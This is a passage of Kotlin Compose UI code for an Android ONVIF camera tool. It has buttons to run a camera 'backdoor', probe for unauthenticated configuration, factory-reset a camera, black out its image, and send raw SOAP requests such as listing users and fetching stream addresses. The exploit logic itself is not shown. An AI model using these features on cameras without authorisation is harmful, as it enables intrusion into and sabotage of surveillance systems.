                    border = BorderStroke(1.dp, Danger.copy(alpha = 0.65f)),
                ) {
                    Text(stringResource(R.string.onvif_bd_run), fontFamily = Sans, fontSize = 11.sp, fontWeight = FontWeight.Bold, color = Danger, textAlign = TextAlign.Center, modifier = Modifier.padding(vertical = 9.dp))
                }
                backdoorMsg?.let {
                    Spacer(Modifier.height(4.dp))
                    Text(it, fontFamily = Mono, fontSize = 8.sp, color = if (it.startsWith("target") || it.startsWith("device")) Danger else TacGreen)
                }
                Spacer(Modifier.height(4.dp))
                Text(stringResource(R.string.onvif_bd_warn), fontFamily = Sans, fontSize = 7.5.sp, color = Gray, lineHeight = 11.sp)
                Spacer(Modifier.height(6.dp))
                // 未认证配置探测
                var unauthResults by remember { mutableStateOf<List<String>?>(null) }
                Surface(
                    modifier = Modifier.fillMaxWidth().clickable {
                        haptic.hud()
                        kotlinx.coroutines.GlobalScope.launchSafe {
                            unauthResults = manager.probeUnauthConfig(cam)
                        }
                    },
                    shape = CutCornerShape(topStart = 8.dp, bottomEnd = 8.dp),
                    color = Gold.copy(alpha = 0.10f),
                    border = BorderStroke(1.dp, Gold.copy(alpha = 0.5f)),
                ) {
                    Text(stringResource(R.string.onvif_bd_probe), fontFamily = Sans, fontSize = 11.sp, fontWeight = FontWeight.Bold, color = Gold, textAlign = TextAlign.Center, modifier = Modifier.padding(vertical = 9.dp))
                }
                unauthResults?.let { results ->
                    Spacer(Modifier.height(5.dp))
                    if (results.isEmpty()) {
                        Text(stringResource(R.string.onvif_bd_probe_none), fontFamily = Mono, fontSize = 8.sp, color = Gray)
                    } else {
                        results.take(6).forEach { r ->
                            Text("▸ $r", fontFamily = Mono, fontSize = 7.5.sp, color = TacGreen, maxLines = 2, modifier = Modifier.padding(vertical = 1.dp))
                        }
                    }
                }
            }

            Spacer(Modifier.height(6.dp))
            // 恢复出厂:双重确认
            var confirmReset by remember { mutableStateOf(false) }
            Surface(
                modifier = Modifier.fillMaxWidth().clickable {
                    haptic.hud()
                    if (!confirmReset) {
                        confirmReset = true
                    } else {
                        confirmReset = false
                        kotlinx.coroutines.GlobalScope.launchSafe {
                            val err = manager.factoryReset(cam, user, pass)
                            onOp(err ?: context.getString(R.string.onvif_ok_reset), err != null)
                        }
                    }
                },
                shape = CutCornerShape(topStart = 8.dp, bottomEnd = 8.dp),
                color = if (confirmReset) Danger.copy(alpha = 0.30f) else Danger.copy(alpha = 0.10f),
                border = BorderStroke(1.dp, Danger.copy(alpha = 0.7f)),
            ) {
                Text(
                    if (confirmReset) stringResource(R.string.onvif_confirm_reset) else stringResource(R.string.onvif_btn_reset),
                    fontFamily = Sans, fontSize = 11.sp, fontWeight = FontWeight.Bold,
                    color = Danger, textAlign = TextAlign.Center,
                    modifier = Modifier.padding(vertical = 10.dp),
                )
            }
            Spacer(Modifier.height(4.dp))
            Text(stringResource(R.string.onvif_reboot_warn), fontFamily = Sans, fontSize = 8.sp, color = Gray, lineHeight = 12.sp)
        }
    }
}

@Composable
private fun PtzButton(label: String, modifier: Modifier = Modifier, onClick: () -> Unit) {
    Surface(
        modifier = modifier.clickable(onClick = onClick),
        shape = CutCornerShape(topStart = 6.dp, bottomEnd = 6.dp),
        color = Gold.copy(alpha = 0.10f),
        border = BorderStroke(1.dp, Gold.copy(alpha = 0.5f)),
    ) {
        Text(label, fontFamily = Mono, fontSize = 13.sp, fontWeight = FontWeight.Bold, color = Gold, textAlign = TextAlign.Center, modifier = Modifier.padding(vertical = 10.dp))
    }
}

// ─── 影像 ────────────────────────────────────────────────────────────────────

@Composable
private fun ImagingTab(
    manager: OnvifCamManager,
    cam: OnvifCamManager.OnvifCamera?,
    user: String,
    pass: String,
    onOp: (String?, Boolean) -> Unit,
) {
    val haptic = LocalHapticFeedback.current
    val context = LocalContext.current
    Column(Modifier.fillMaxSize()) {
        if (cam == null) {
            EmptyHint(stringResource(R.string.onvif_pick_first))
            return@Column
        }
        TermPanel(stringResource(R.string.onvif_panel_imaging)) {
            Text(stringResource(R.string.onvif_imaging_desc), fontFamily = Sans, fontSize = 9.sp, color = Gray, lineHeight = 13.sp)
            Spacer(Modifier.height(8.dp))
            Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                Surface(
                    modifier = Modifier.weight(1f).clickable {
                        haptic.hud()
                        kotlinx.coroutines.GlobalScope.launchSafe {
                            val err = manager.darken(cam, user, pass, restore = false)
                            onOp(err ?: context.getString(R.string.onvif_ok_darken), err != null)
                        }
                    },
                    shape = CutCornerShape(topStart = 8.dp, bottomEnd = 8.dp),
                    color = Danger.copy(alpha = 0.12f),
                    border = BorderStroke(1.dp, Danger.copy(alpha = 0.6f)),
                ) {
                    Text(stringResource(R.string.onvif_btn_darken), fontFamily = Sans, fontSize = 11.sp, fontWeight = FontWeight.Bold, color = Danger, textAlign = TextAlign.Center, modifier = Modifier.padding(vertical = 9.dp))
                }
                Surface(
                    modifier = Modifier.weight(1f).clickable {
                        haptic.hud()
                        kotlinx.coroutines.GlobalScope.launchSafe {
                            val err = manager.darken(cam, user, pass, restore = true)
                            onOp(err ?: context.getString(R.string.onvif_ok_restore), err != null)
                        }
                    },
                    shape = CutCornerShape(topStart = 8.dp, bottomEnd = 8.dp),
                    color = TacGreen.copy(alpha = 0.10f),
                    border = BorderStroke(1.dp, TacGreen.copy(alpha = 0.55f)),
                ) {
                    Text(stringResource(R.string.onvif_btn_restore), fontFamily = Sans, fontSize = 11.sp, fontWeight = FontWeight.Bold, color = TacGreen, textAlign = TextAlign.Center, modifier = Modifier.padding(vertical = 9.dp))
                }
            }
            Spacer(Modifier.height(6.dp))
            Text(stringResource(R.string.onvif_imaging_warn), fontFamily = Sans, fontSize = 8.sp, color = Gray, lineHeight = 12.sp)
        }
    }
}

@Composable
private fun InfoRow2(label: String, value: String) {
    Row(Modifier.fillMaxWidth().padding(vertical = 2.dp)) {
        Text(label, fontFamily = Mono, fontSize = 8.sp, color = Gray, modifier = Modifier.width(72.dp))
        Text(value, fontFamily = Mono, fontSize = 8.sp, color = White, modifier = Modifier.weight(1f))
    }
}

/** 无界安全启动:页面销毁后不崩;异常吞掉并在日志可见 */
private fun kotlinx.coroutines.CoroutineScope.launchSafe(block: suspend () -> Unit) {
    launch {
        try {
            block()
        } catch (_: Exception) {
        }
    }
}

// ─── SOAP 控制台(交互 shell 的本结构版) ───────────────────────────────────────

@Composable
private fun ConsoleTab(
    manager: OnvifCamManager,
    cam: OnvifCamManager.OnvifCamera?,
    user: String,
    pass: String,
) {
    val haptic = LocalHapticFeedback.current
    var methodName by remember { mutableStateOf(CONSOLE_METHODS.first().first) }
    var xml by remember { mutableStateOf(CONSOLE_METHODS.first().second) }
    var response by remember { mutableStateOf<String?>(null) }

    Column(Modifier.fillMaxSize()) {
        if (cam == null) {
            EmptyHint(stringResource(R.string.onvif_pick_first))
            return@Column
        }
        TermPanel(stringResource(R.string.onvif_panel_console)) {
            Text(stringResource(R.string.onvif_console_desc), fontFamily = Sans, fontSize = 9.sp, color = Gray, lineHeight = 13.sp)
            Spacer(Modifier.height(6.dp))
            CONSOLE_METHODS.take(6).chunked(3).forEach { row ->
                Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(5.dp)) {
                    row.forEach { (name, xmlTpl) ->
                        Surface(
                            modifier = Modifier.weight(1f).clickable {
                                haptic.hud()
                                methodName = name
                                xml = xmlTpl
                            },
                            shape = CutCornerShape(topStart = 5.dp, bottomEnd = 5.dp),
                            color = if (methodName == name) Gold.copy(alpha = 0.16f) else SurfaceAlt,
                            border = BorderStroke(1.dp, if (methodName == name) Gold.copy(alpha = 0.7f) else BorderDim),
                        ) {
                            Text(name, fontFamily = Mono, fontSize = 8.sp, fontWeight = FontWeight.Bold, color = if (methodName == name) Gold else Gray, textAlign = TextAlign.Center, maxLines = 1, modifier = Modifier.padding(horizontal = 3.dp, vertical = 6.dp))
                        }
                    }
                }
                Spacer(Modifier.height(5.dp))
            }
            androidx.compose.foundation.text.BasicTextField(
                value = xml,
                onValueChange = { xml = it },
                textStyle = TextStyle(fontFamily = Mono, fontSize = 9.sp, color = White),
                cursorBrush = SolidColor(Gold),
                modifier = Modifier
                    .fillMaxWidth()
                    .height(140.dp)
                    .clip(CutCornerShape(topStart = 7.dp, bottomEnd = 7.dp))
                    .background(Color(0xFF04121C))
                    .border(1.dp, BorderDim, CutCornerShape(topStart = 7.dp, bottomEnd = 7.dp))
                    .padding(8.dp),
            )
            Spacer(Modifier.height(6.dp))
            ActionButton(
                running = false,
                runLabel = stringResource(R.string.onvif_btn_console_send),
                stopLabel = stringResource(R.string.onvif_btn_console_send),
                modifier = Modifier.fillMaxWidth(),
            ) {
                haptic.hud()
                kotlinx.coroutines.GlobalScope.launchSafe {
                    response = manager.soapConsole(cam, user, pass, xml)
                }
            }
            response?.let { resp ->
                Spacer(Modifier.height(6.dp))
                Text(stringResource(R.string.onvif_console_resp), fontFamily = Mono, fontSize = 8.sp, fontWeight = FontWeight.Bold, color = Gold)
                Spacer(Modifier.height(3.dp))
                Text(resp.take(2000), fontFamily = Mono, fontSize = 7.5.sp, color = TacGreen, lineHeight = 11.sp, modifier = Modifier.fillMaxWidth().heightIn(max = 180.dp))
            }
        }
    }
}

/** 控制台常用方法模板 */
private val CONSOLE_METHODS = listOf(
    "设备信息" to """<GetDeviceInformation xmlns="http://www.onvif.org/ver10/device/wsdl"/>""",
    "系统时间" to """<GetSystemDateAndTime xmlns="http://www.onvif.org/ver10/device/wsdl"/>""",
    "用户列表" to """<GetUsers xmlns="http://www.onvif.org/ver10/device/wsdl"/>""",
    "媒体档" to """<GetProfiles xmlns="http://www.onvif.org/ver10/media/wsdl"/>""",
    "流地址" to """<GetStreamUri xmlns="http://www.onvif.org/ver10/media/wsdl"><StreamSetup><Stream>RTP-Unicast</Stream><Transport><Protocol>RTSP</Protocol></Transport></StreamSetup><ProfileToken>0</ProfileToken></GetStreamUri>""",
    "快照地址" to """<GetSnapshotUri xmlns="http://www.onvif.org/ver10/media/wsdl"><ProfileToken>0</ProfileToken></GetSnapshotUri>""",
)
